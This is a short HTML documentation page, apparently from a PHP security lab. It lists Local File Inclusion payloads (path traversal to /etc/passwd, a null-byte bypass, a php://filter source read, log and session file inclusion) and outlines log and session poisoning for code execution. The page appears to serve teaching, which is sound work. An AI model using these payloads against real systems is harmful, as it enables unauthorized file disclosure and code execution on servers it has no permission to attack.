<h2>Documentation</h2>

<h3>Common LFI Payloads:</h3>
<pre>
# Basic path traversal
?page=../../../etc/passwd

# Null byte bypass (PHP < 5.3.4)
?page=../../../etc/passwd%00

# PHP filter wrapper
?page=php://filter/convert.base64-encode/resource=index.php

# Apache log files
?page=../../../var/log/apache2/access.log

# PHP session files
?page=../../../var/lib/php/sessions/sess_[SESSION_ID]
</pre>

<h3>Exploitation Techniques:</h3>

<h4>1. Reading Sensitive Files</h4>
<p>Use path traversal to read system files like /etc/passwd, configuration files, or application source code.</p>

<h4>2. Log Poisoning</h4>
<p>Inject PHP code into Apache access logs via User-Agent header, then include the log file to execute the code.</p>

<h4>3. Session Poisoning</h4>
<p>Inject PHP code into session variables, then include the session file to execute the code.</p>

<div class="warning">
    <strong>Important:</strong> These techniques work because the application uses PHP's include() function
    with unsanitized user input.
</div>
